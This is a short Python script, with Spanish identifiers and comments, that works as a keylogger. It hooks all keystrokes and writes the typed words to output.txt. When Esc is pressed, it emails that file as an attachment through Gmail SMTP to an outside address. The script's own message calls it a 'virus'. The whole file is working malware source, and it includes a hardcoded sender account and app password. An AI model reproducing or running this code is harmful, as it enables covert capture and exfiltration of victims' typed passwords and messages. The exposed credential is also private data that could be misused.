import keyboard 

palabra = ""


def pulsacion_tecla(pulsacion):
    global palabra
    if pulsacion.event_type == keyboard.KEY_DOWN:
        if pulsacion.name == "space":
            guardar_palabra_espacio()
        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable():
            palabra += pulsacion.name
    
keyboard.hook(pulsacion_tecla)

def guardar_palabra_espacio():
    with open("output.txt", "a") as file:

        file.write(palabra + "\n")
    print(f'Palabra guardada: {palabra}')
    resetear_palabra()

def resetear_palabra():
    global palabra
    palabra = ""

def enviar_archivo_correo():
    import smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email import encoders
    from email.mime.text import MIMEText

    fromaddr = "juancbotero4@gmail.com"
    toaddr = "juan.84579912@uru.edu"
    subject = "Archivo output.txt"

    # Crear el objeto del mensaje
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = subject

    # Adjuntar el cuerpo del mensaje
    body = "Adjunto el archivo output.txt"
    msg.attach(MIMEText(body, 'plain'))

    # Adjuntar el archivo
    filename = "output.txt"
    attachment = open(filename, "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f"attachment; filename= {filename}")

    msg.attach(part)

    # Configurar el servidor SMTP
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "facv fiuk vwul wdve")  # Reemplaza con la contraseña de aplicación

    # Enviar el correo
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

    print("Correo enviado exitosamente")


try:
    keyboard.wait("esc")
    enviar_archivo_correo()
except KeyboardInterrupt:
    print("Virus detenido")
    pass
